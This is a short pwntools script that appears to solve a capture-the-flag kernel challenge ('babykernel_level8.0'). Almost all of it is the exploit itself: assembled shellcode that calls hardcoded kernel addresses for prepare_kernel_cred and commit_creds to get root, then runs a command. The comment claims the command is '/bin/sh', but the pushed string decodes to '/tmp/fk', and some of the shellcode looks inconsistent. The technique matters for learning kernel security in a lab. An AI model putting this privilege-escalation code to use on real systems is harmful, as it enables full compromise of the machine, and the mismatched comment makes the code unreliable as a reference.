from pwn import *
import os

context.arch = "amd64"

binary = "/challenge/babykernel_level8.0"

p = process(binary)

# commit_creds(prepare_kernel_cred(0)); run_cmd("/bin/sh")
payload = asm("xor rax, rax; mov rax, 1; mov rdi, 3; lea rsi, [rip+0x3]; syscall; ret; xor rdi, rdi; mov rax, 0xffffffff810890d0; call rax; mov rdi, rax; mov rax, 0xffffffff81088d90; call rax; mov rax, 0x6b662f706d742f; push rax; push rsp; pop rdi; mov rax, 0xffffffff81089580; call rax")

p.send(payload)
p.interactive()
